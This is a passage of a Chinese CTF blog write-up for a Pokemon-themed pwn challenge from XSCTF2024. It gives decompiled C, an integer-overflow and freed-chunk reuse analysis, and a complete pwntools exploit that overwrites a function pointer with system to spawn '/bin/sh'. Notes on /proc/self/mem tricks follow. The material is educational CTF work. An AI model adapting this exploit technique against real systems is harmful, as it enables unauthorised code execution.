class="keyword">if</span> ( v2 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          *(_QWORD *)a1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">31</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">10</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">11</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">10</span>;</span><br><span class="line">          Pokemon_name(a1, <span class="string">&quot;Bulbasaur&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          *(_QWORD *)a1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">21</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">16</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">8</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">14</span>;</span><br><span class="line">          Pokemon_name(a1, <span class="string">&quot;Pikapi&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          *(_QWORD *)a1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">25</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">12</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">14</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">14</span>;</span><br><span class="line">          Pokemon_name(a1, <span class="string">&quot;Charmander&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)a1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">28</span>;</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">9</span>;</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">20</span>;</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">9</span>;</span><br><span class="line">  Pokemon_name(a1, <span class="string">&quot;Squirtle&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SThj8">case1 ：Store</h3>
+
+<p>是一个商店，卖攻击药剂和防御药剂还有精灵球，买精灵球会有change++，猜测是改名机会。</p>
+<p>防御剂是攻击下降，防御上升。攻击剂是攻击上升，防御下降。</p>
+<p>攻击是a1+20</p>
+<p>防御是a1+28</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">Store</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;m a merchant from GuanDu city, what do you want to buy?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Attack agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Defensive agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(a3Pok);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.EXIT&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          money -= <span class="number">75</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Are you sure this is not a name change card?&quot;</span>);</span><br><span class="line">          v3 = <span class="built_in">malloc</span>(<span class="number">0xF</span>uLL);</span><br><span class="line">          ++change;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          money -= <span class="number">75</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) += <span class="number">10</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) -= <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          money -= <span class="number">75</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) -= <span class="number">10</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) += <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You say: f**king Black-hearted businessman&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="nz0qf">case 2 : out</h3>
+
+<p>外出函数，分析下来就是左转遇到小精灵能够赚钱，右转遇到神兽，打赢了就会free掉一个（ex1t所在的）chunk。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">Out</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  Outmenu();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;You haven&#x27;t encountered a beast, but you&#x27;ve encountered a TAT that guards the treasure, so try to stun it for some loot&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TAT: WTF!&quot;</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">6</span>) = <span class="number">15</span>;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">5</span>) = <span class="number">1</span>;</span><br><span class="line">    Pokemon_name(&amp;ptr, <span class="string">&quot;TAT&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)Fight(a1, ptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Your earn some money~&quot;</span>);</span><br><span class="line">      money += <span class="number">200</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Loser...&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re very lucky, it&#x27;s the Divine Beast QWQ that roars in front of you, let&#x27;s grab it and knock it out first!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;QWQ: qwq~ qwq~ qwq~ qwq~ qwq~ qwq~&quot;</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">4</span>) = <span class="number">9999</span>;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">6</span>) = <span class="number">15</span>;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">7</span>) = <span class="number">9999</span>;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">5</span>) = <span class="number">9999</span>;</span><br><span class="line">  Pokemon_name(&amp;ptr, <span class="string">&quot;QWQ&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)Fight(a1, ptr) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The soul of the mythical beast flew away...&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ex1t);</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用到了Fight函数让两个精灵进行决斗。</p>
+<p>Fight函数里面选攻击就好了(就不逆向了，都是一些实现蘸豆的逻辑)，但是你要速度快并且一刀能打死QWQ。</p>
+<h3 id="Dtk36">case 3 : Status</h3>
+
+<p>对当前状况进行查看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Status</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your money: %d\n&quot;</span>, money);</span><br><span class="line">  <span class="built_in">puts</span>(aTheStatusOfYou);</span><br><span class="line">  Pokemon_print(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Over~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sYL4q">case 4 : ex1t</h3>
+
+<p>使用了函数指针执行退出函数，并且能够控制第一个参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWhat you want to say?&quot;</span>);</span><br><span class="line">  gets(v7);</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(_BYTE *))ex1t)(v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ci7r5">case 666 : gift</h3>
+
+<p>会分配一个0x20大小的堆，并且能够改写一部分内存。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(aWhyDoesTechnol);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  *((_DWORD *)buf + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_DWORD *)buf + <span class="number">6</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_DWORD *)buf + <span class="number">5</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_DWORD *)buf + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s so weak...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="YrD4o">0x2 思路</h2>
+
+<p><strong>开局给了libc地址，这怎么输？</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">*((_DWORD *)ptr + <span class="number">4</span>) = <span class="number">9999</span>;</span><br><span class="line">*((_DWORD *)ptr + <span class="number">6</span>) = <span class="number">15</span>;</span><br><span class="line">*((_DWORD *)ptr + <span class="number">7</span>) = <span class="number">9999</span>;</span><br><span class="line">*((_DWORD *)ptr + <span class="number">5</span>) = <span class="number">9999</span>;</span><br><span class="line">Pokemon_name(&amp;ptr, <span class="string">&quot;QWQ&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>简单观察神兽只有这项属性  *((_DWORD <em>)ptr + 6) &#x3D; 15最低，</em>ptr是我们堆刚开始的地方</p>
+<p>这里Dword是4字节，所以也就是ptr+6*4&#x3D;ptr+24</p>
+<p>我们选精灵的时候，要选这个属性大于QWQ的，才有可能取得胜利。</p>
+<p>也就是我们的Pikapi！</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730780048067-d4d36499-fba8-492f-a9b4-ae20068a788d.png"></p>
+<p>在FIght函数逻辑中，有以下片段，这里其实都是通过计算精灵的属性值，来实现蘸豆。我们不妨设想一下，它们中很有可能就包含精灵的攻击属性和防御属性。虽有大部分都是int类型，但是实际上是无符号类型在运算</p>
+<blockquote>
+<p><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;*(_QWORD *)&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);"> 允许你在不知道原始数据类型的情况下，以特定的方式（这里是64位无符号整数）解释和访问内存中的数据。</font></p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730780204448-5e423477-483b-4c8c-8804-08947db56a99.png"></p>
+<p>所以我们选取皮卡丘，在打败两次小怪之后，买防御剂，让自己的攻击溢出到负数，但是比较用的是Qword所以实际上还是unsigned int，此时速度比QWQ快，能够一击秒杀QWQ。这样会free掉特殊堆块，利用case666，然后申请两次申请回特殊堆块（因为第一次是QWQ的堆块。），之后改写ex1t的hook为system即可getshell。</p>
+<p>free掉的两个堆块进入bin</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33556483/1730784652575-2a9b6bd4-fae5-417d-a4a0-02d60624d70a.png"></p>
+<h2 id="JvWYa">0X3 exp</h2>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&quot;debug&quot;</span>)</span></span><br><span class="line">p=process(<span class="string">&quot;./pokemon_master&quot;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;43.248.97.213&quot;</span>,30058)</span></span><br><span class="line">def <span class="title function_">cmd</span><span class="params">(i)</span>:</span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,str(i))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#choose pikapi</span></span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#recv libcaddr</span></span><br><span class="line">p.<span class="title function_">recvuntil</span><span class="params">(<span class="string">&quot;gift:0x&quot;</span>)</span></span><br><span class="line">puts_addr=<span class="type">int</span>(p.recv(<span class="number">12</span>)[<span class="number">-12</span>:].rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;puts&quot;</span>,hex(puts_addr))</span><br><span class="line">libcbase=puts_addr<span class="number">-0x080e50</span></span><br><span class="line">system=libcbase+<span class="number">0x050d70</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#attack TAT</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#buy defense agents</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line"><span class="meta">#attack QWQ</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#one gadgte</span></span><br><span class="line">one=[<span class="number">0x50a47</span>+libcbase,<span class="number">0xebc81</span>+libcbase,<span class="number">0xebc85</span>+libcbase,<span class="number">0xebc88</span>+libcbase]</span><br><span class="line"></span><br><span class="line">#CMD <span class="number">666</span> backdoor</span><br><span class="line">cmd(<span class="number">666</span>)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line">cmd(<span class="number">666</span>)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line">print(<span class="string">&quot;libcbase&quot;</span>,hex(libcbase))</span><br><span class="line"><span class="meta">#gdb.attach(p,<span class="string">&quot;b *$rebase(0x137b)&quot;</span>)</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h1><h1 id="wahahabox"><a href="#wahahabox" class="headerlink" title="wahahabox"></a>wahahabox</h1><p>提示：&#x2F;proc下的文件非常有用</p>
+<p>&#x2F;proc&#x2F;self&#x2F;当前存储进程信息的目录</p>
+<p>environ</p>
+<p>exe</p>
+<p>fd</p>
+<p>maps</p>
+<p>映射信息</p>
+<p>libc地址，elf地址，ld地址</p>
+<p>libc上有用的东西</p>
+<p>system binsh，one_gadget，mprotect, IO_File</p>
+<p> &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6  </p>
+<p>&#x2F;proc&#x2F;self&#x2F;mem</p>
+<p>就算是只读的rodata段上的数据也是可以的。</p>
+<p>open、read和lseek才有可能完成内存改写的利用。</p>
+<p>ida7.7  插件比较多， 逆向可能需要</p>
+<p>ida8.3  </p>
+<p>ida9.0  比较新，支持很多新特性</p>
+<p>类型转换的问题</p>
+<p>int的数据转换成unsigned的数据，未经过处理的话，就会有问题。</p>
+<p>-1   					bigbigbig</p>
+<p>0xffffffffff…..</p>
+<p>Qword  &lt;-&gt;   size_t</p>
+<p>Dword  &lt;-&gt;  unsigned</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>xswlhhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2024/11/09/XSCTF2024pwn%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0-wp/" title="XSCTF2024pwn出题笔记&amp;wp">http://example.com/2024/11/09/XSCTF2024pwn出题笔记-wp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+	
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctfwp/" rel="tag"># ctfwp</a>
+              <a href="/tags/2024wp/" rel="tag"># 2024wp</a>
+              <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag"># 出题笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/08/C-%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E6%96%87%E6%9C%AC%E6%9F%A5%E8%AF%A2%E7%A8%8B%E5%BA%8F/" rel="prev" title="C++第三次小项目——文本查询程序">
+      <i class="fa fa-chevron-left"></i> C++第三次小项目——文本查询程序
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81OTY4MS8zNjE0Mw=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+	<!--网易云插件-->
+	<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=489847882&auto=1&height=66"></iframe>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#eke1j"><span class="nav-number">1.</span> <span class="nav-text">【新生专属】c_master</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#KKWD0"><span class="nav-number">1.1.</span> <span class="nav-text">0x1 逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PrugN"><span class="nav-number">1.2.</span> <span class="nav-text">0x2 思路总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eP23o"><span class="nav-number">1.3.</span> <span class="nav-text">0x3 exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#vB3fp"><span class="nav-number">2.</span> <span class="nav-text">Wahahabox</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pf3f5"><span class="nav-number">2.1.</span> <span class="nav-text">0X1 逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TJ4h3"><span class="nav-number">2.2.</span> <span class="nav-text">0X2 思路总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vQKCf"><span class="nav-number">2.3.</span> <span class="nav-text">0x3 exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CBjVJ"><span class="nav-number">3.</span> <span class="nav-text">Pokemon_master</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#uivlG"><span class="nav-number">3.1.</span> <span class="nav-text">0x0 源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#aJUjD"><span class="nav-number">3.2.</span> <span class="nav-text">0x1 逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sylRr"><span class="nav-number">3.2.1.</span> 